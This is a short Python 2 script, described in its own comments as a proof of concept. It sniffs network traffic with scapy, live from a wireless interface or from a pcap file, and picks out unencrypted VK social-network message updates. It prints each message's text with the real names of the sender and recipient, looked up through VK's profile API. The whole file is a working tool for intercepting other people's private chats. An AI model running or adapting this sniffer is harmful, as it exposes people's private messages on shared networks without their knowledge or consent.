#!/usr/bin/env python2.7

from scapy.all import *
import urllib2
import json
from time import sleep
from urlparse import urlparse
import os
import argparse
import sys

ts, num, friend_id, time, msg, msg_sended=0, 0, 0, 0, '', ''

# This is just PoC :)

# Special bytes, with them we can detect type of message
msg_recive = [49, 17] # Add here smth by yourself, if you detect new varibles
msg_send = [51, 3, 19] # Add here smth by yourself, if you detect new varibles

ap = argparse.ArgumentParser(epilog="Example:  python "+sys.argv[0]+" -i wlan0", prog=sys.argv[0], formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50))
ap.add_argument('--interface', '-i', nargs=1, help="Interface for listening packets")
ap.add_argument('--pcap', '-p', nargs=1, help="Pcap file for parse")
opts = ap.parse_args()

pcts = list()

def show_msgs(pack):
	try:

		if '{"ts":' in pack.load:			# find packet with response from vk server
			answ = json.loads(pack.load.split('\r\n\r\n')[1][:-2]) # load data as json
			for i in answ['updates']:
				if i[0] == 4: # we need array with msg data
					num, friend_id, time, msg = i[1], i[3], i[4], i[6] # parse data
					if msg in pcts:
						pass
					else:
						# detect message was from/to via special bytes
						pcts.append(msg)
						if i[2] in msg_recive:
							print '['+get_name_by_id(friend_id)+'] => ['+pack[IP].dst+']: '+msg
						elif i[2] in msg_send:
							print '['+pack[IP].dst+']'+' => ['+get_name_by_id(friend_id)+']: '+msg
					if len(pcts) > 10:
						pcts.pop(0)

		#print test
	except: pass

def get_name_by_id(id): # just print real name from vk by id
	get_name = json.loads(urllib2.urlopen('https://api.vk.com/method/getProfiles?uids='+str(id)).readlines()[0])
	friend_name = get_name["response"][0]["first_name"]+' '+get_name["response"][0]["last_name"]
	return friend_name


try:
	if opts.pcap != None:
	 	for i in PcapReader(opts.pcap[0]):
	 		show_msgs(i)
	if opts.interface[0] !=None:
	 	sniff(iface=opts.interface[0], prn=show_msgs)
except:
	pass


